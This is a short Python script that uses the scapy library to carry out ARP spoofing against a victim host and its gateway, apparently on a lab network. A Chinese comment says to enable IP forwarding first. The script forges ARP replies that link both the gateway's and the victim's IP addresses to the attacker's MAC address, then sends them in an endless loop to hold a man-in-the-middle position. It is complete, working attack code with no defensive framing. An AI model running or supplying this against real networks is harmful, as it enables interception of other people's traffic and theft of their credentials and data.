from scapy.all import  *
import time
# 要先开启Linux的转发功能 echo 1 >> /proc/sys/net/ipv4/ip_forward
def main():
    gatewayIP = "192.168.64.2"
    victimIP = "192.168.64.129"

    hackMAC = "00:0c:29:65:f3:db"
    victimMAC = "00:0c:29:f6:d1:d5"
    gatewayMAC = "00:50:56:fe:20:b4"

    # print(getmacbyip("192.168.64.2"))
    packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC, dst=gatewayMAC) / ARP(hwsrc=hackMAC, hwdst=gatewayMAC, psrc=victimIP, pdst=gatewayIP,op=2)
    while 1:
        sendp(packet1)
        sendp(packet2)
        time.sleep(2)
        print(packet1.show())
        print(packet2.show())
if __name__ == '__main__':
    main()